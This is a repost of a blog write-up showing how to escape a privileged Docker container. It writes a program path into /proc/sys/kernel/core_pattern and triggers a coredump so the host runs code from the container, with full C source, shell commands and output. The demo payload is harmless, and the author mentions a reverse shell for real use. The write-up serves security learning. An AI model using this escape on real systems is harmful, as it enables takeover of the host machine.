<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://pwning.systems/posts/escaping-containers-for-fun/">Original</a>
    <h1>Escaping privileged containers for fun</h1>
    
    <div id="readability-page-1" class="page"><div><div>
        <p>Despite the fact that it is not a <em>‘real’</em> vulnerability, escaping privileged Docker containers is nevertheless pretty funny. And because there will always be people who will come up with reasons or excuses to run a privileged container (even though you really shouldn’t), this could really be handy at some point in the future.</p>
<p>As a result of the recent discovery of the <code>cgroup_release_agent</code> escape trick (CVE-2022-0492), I went on a search for calls to the <code>call_usermodehelper_*</code> family and attempted to determine which ones may be easily accessed within a container environment.</p>
<p>It is necessary to understand what <code>call_usermodehelper</code> is before we can take a look at the results. What <code>call_usermodehelper</code> essentially does is run a program in usermode, which is a convenient feature for security researchers ;).</p>
<p>After a short grep, I discovered that the kernel’s coredump handling code included a call to this particular function. You may see a sample of the code in the section below.</p>
<div><pre tabindex="0"><code data-lang="c"><span>for</span> (argi <span>=</span> <span>0</span>; argi <span>&lt;</span> argc; argi<span>++</span>)
        helper_argv[argi] <span>=</span> cn.corename <span>+</span> argv[argi];
helper_argv[argi] <span>=</span> NULL;

retval <span>=</span> <span>-</span>ENOMEM;
sub_info <span>=</span> call_usermodehelper_setup(helper_argv[<span>0</span>],
                                helper_argv, NULL, GFP_KERNEL,
                                umh_pipe_setup, NULL, <span>&amp;</span>cprm);
<span>if</span> (sub_info)
        retval <span>=</span> call_usermodehelper_exec(sub_info,
                                          UMH_WAIT_EXEC);

kfree(helper_argv);
</code></pre></div><p>Then it occurred to me that this would be a good target to shoot at after all. Even more so because there is nothing that would prevent us from performing a coredump in a container, right? (In addition, technologies such as apport/systemd-coredump are interesting targets to investigate at some point in the future)</p>
<p>The only thing left to do is try to figure out how this code got accessed in the first place. Fortunately, a quick <code>man 5 core</code> revealed exactly how this works!</p>
<blockquote>
<p><strong>From the manuals:</strong> Since kernel 2.6.19, Linux supports an alternate syntax for the /proc/sys/kernel/core_pattern file.  If the first character of this file is a pipe symbol (|), then the remainder of the line is interpreted as the command-line for a user-space program (or script) that is to be executed.</p>
</blockquote>
<p>For the most part, what this implies is that if we can successfully write our <em>“evil”</em> program to <code>/proc/sys/kernel/core_pattern</code> prefixed with a pipe, the kernel will execute our program outside of our container.</p>
<p>One of the prerequisites for this is that our binary is reachable on the host operating system. Fortunately, the folders that OverlayFS (Docker’s filesystem) is mounting are also reachable on the host operating system. By performing the <code>mount</code> command in the container, we can determine the location of the filesystem. Let’s take a look at the results.</p>
<div><pre tabindex="0"><code data-lang="bash">root@80f74c2d80e5:/# mount
overlay on / type overlay <span>(</span>rw,relatime,lowerdir<span>=</span>/var/lib/docker/overlay2/l/VNLJAHVXND5S423TW3TWVSKI7G:/var/lib/docker/overlay2/l/HMQWWMKA2U45KTCTUVDFHWCHQ2,upperdir<span>=</span>/var/lib/docker/overlay2/c6c17d65527df160607559e9700ac930b50fe3271402c0adf30a9d96cef21680/diff,workdir<span>=</span>/var/lib/docker/overlay2/c6c17d65527df160607559e9700ac930b50fe3271402c0adf30a9d96cef21680/work<span>)</span>
proc on /proc type proc <span>(</span>rw,nosuid,nodev,noexec,relatime<span>)</span>
tmpfs on /dev type tmpfs <span>(</span>rw,nosuid,size<span>=</span>65536k,mode<span>=</span>755,inode64<span>)</span>
devpts on /dev/pts type devpts <span>(</span>rw,nosuid,noexec,relatime,gid<span>=</span>5,mode<span>=</span>620,ptmxmode<span>=</span>666<span>)</span>
sysfs on /sys type sysfs <span>(</span>rw,nosuid,nodev,noexec,relatime<span>)</span>
cgroup on /sys/fs/cgroup type cgroup2 <span>(</span>rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot<span>)</span>
mqueue on /dev/mqueue type mqueue <span>(</span>rw,nosuid,nodev,noexec,relatime<span>)</span>
shm on /dev/shm type tmpfs <span>(</span>rw,nosuid,nodev,noexec,relatime,size<span>=</span>65536k,inode64<span>)</span>
/dev/md2 on /etc/resolv.conf type ext4 <span>(</span>rw,relatime<span>)</span>
/dev/md2 on /etc/hostname type ext4 <span>(</span>rw,relatime<span>)</span>
/dev/md2 on /etc/hosts type ext4 <span>(</span>rw,relatime<span>)</span>
devpts on /dev/console type devpts <span>(</span>rw,nosuid,noexec,relatime,gid<span>=</span>5,mode<span>=</span>620,ptmxmode<span>=</span>666<span>)</span>
</code></pre></div><p>If you take a look at the first line, you’ll see that the ‘diff’ layer is <code>/var/lib/docker/overlay2/c6c17d65527df160607559e9700ac930b50fe3271402c0adf30a9d96cef21680/diff</code> This is actually the location of this directory on the host.</p>
<p>This may be verified by writing something to a file on the container with an extraordinarily precise name such that we can use the find command on the host to locate the file on the container:</p>
<div><pre tabindex="0"><code data-lang="bash"><span># make the file in the container</span>
root@80f74c2d80e5:/# echo <span>&#34;hi host&#34;</span> &gt; bladiebladiebla.txt

<span># find the file on the host</span>
$ find / -name <span>&#34;bladiebladiebla.txt&#34;</span>
/var/lib/docker/overlay2/c6c17d65527df160607559e9700ac930b50fe3271402c0adf30a9d96cef21680/diff/bladiebladiebla.txt
/var/lib/docker/overlay2/c6c17d65527df160607559e9700ac930b50fe3271402c0adf30a9d96cef21680/merged/bladiebladiebla.txt

<span># check out it&#39;s contents on the host</span>
$ cat /var/lib/docker/overlay2/c6c17d65527df160607559e9700ac930b50fe3271402c0adf30a9d96cef21680/diff/bladiebladiebla.txt
hi host
</code></pre></div><p>Now, my original plan was to create a binary in the container, and we’ve already figured out where it’s going to be placed on the host machine in question. Afterwards, we’ll need to make it the command in <code>/proc/sys/kernel/core_pattern</code>, and then trigger it by generating a coredump!</p>
<p>Let’s test this by creating a very minimal C program that will write something to <code>/tmp/hacked</code>.</p>
<div><pre tabindex="0"><code data-lang="C"><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span></span>
<span>int</span> <span>main</span>(<span>void</span>)
{
    FILE <span>*</span>fp;
    fp <span>=</span> fopen(<span>&#34;/tmp/hacked&#34;</span>, <span>&#34;w&#34;</span>);
    fprintf(fp, <span>&#34;Hello from the container!</span><span>\n</span><span>&#34;</span>);
    fclose(fp);
    <span>return</span> <span>0</span>;
}
</code></pre></div><p>Let’s write this file to the system and test it to see if it performs as expected.</p>
<div><pre tabindex="0"><code data-lang="bash"><span># write poc to system</span>
root@80f74c2d80e5:/# vim poc.c
<span># compile it</span>
root@80f74c2d80e5:/# gcc -o poc poc.c
<span># figure out the location from the diff variable</span>
root@80f74c2d80e5:/# mount | head -n <span>1</span>
overlay on / type overlay <span>(</span>rw,relatime,lowerdir<span>=</span>/var/lib/docker/overlay2/l/VNLJAHVXND5S423TW3TWVSKI7G:/var/lib/docker/overlay2/l/HMQWWMKA2U45KTCTUVDFHWCHQ2,upperdir<span>=</span>/var/lib/docker/overlay2/c6c17d65527df160607559e9700ac930b50fe3271402c0adf30a9d96cef21680/diff,workdir<span>=</span>/var/lib/docker/overlay2/c6c17d65527df160607559e9700ac930b50fe3271402c0adf30a9d96cef21680/work<span>)</span>
<span># actually set the program to be executed on coredumps to our program on the host </span>
root@80f74c2d80e5:/# echo <span>&#34;|/var/lib/docker/overlay2/c6c17d65527df160607559e9700ac930b50fe3271402c0adf30a9d96cef21680/diff/poc&#34;</span> &gt; /proc/sys/kernel/core_pattern
</code></pre></div><p>The only thing left to do is to trigger a coredump! There are a variety of approaches you may take, but I usually just write some plainly broken C (let’s pretend that’s what I’m intending to do).</p>
<div><pre tabindex="0"><code data-lang="C"><span>// pretty sure this crashes :)
</span><span></span><span>int</span> <span>main</span>(<span>void</span>) {
	<span>char</span> buf[<span>1</span>];
	<span>for</span> (<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>100</span>; i<span>++</span>) {
		buf[i] <span>=</span> <span>1</span>;
	}
	<span>return</span> <span>0</span>;
}
</code></pre></div><p>Let’s write it to the system, compile it and trigger it!</p>
<div><pre tabindex="0"><code data-lang="bash"><span># write the file to the system</span>
root@80f74c2d80e5:/# vim crash.c
<span># compile the binary</span>
root@80f74c2d80e5:/# gcc -o crash crash.c
<span># crash all the things!</span>
root@80f74c2d80e5:/# ./crash
*** stack smashing detected ***: terminated
Aborted <span>(</span>core dumped<span>)</span>
</code></pre></div><p>Now if we take a look at the <code>/tmp/hacked</code> file on the host, you’ll see that it got our content!</p>
<div><pre tabindex="0"><code data-lang="bash">$ cat /tmp/hacked
Hello from the container!
</code></pre></div><p>Now, in a real-world scenario, you’d probably want to start a reverse shell or something similar instead of simply writing to <code>/tmp/hacked</code>. This was just an example to explain the concept. Keep in mind that privileged containers should <strong>NOT</strong> be run.</p>
<p>Cheers!</p>

      </div></div></div>
  </body>
</html>
